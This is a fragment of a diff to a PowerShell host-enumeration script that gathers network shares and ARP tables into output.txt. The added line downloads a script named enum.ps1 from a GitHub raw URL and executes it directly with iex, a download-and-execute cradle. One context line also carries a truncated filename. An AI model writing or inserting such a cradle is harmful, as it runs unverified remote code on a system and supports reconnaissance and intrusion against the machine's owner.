@@ -21,3 +21,5 @@ net share >> output.txt
 
 Write-Output "ARP ##" | Out-File -Append -FilePath .\output.txt
 arp -a >> output.tx
+
+(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/enum.ps1") | iex
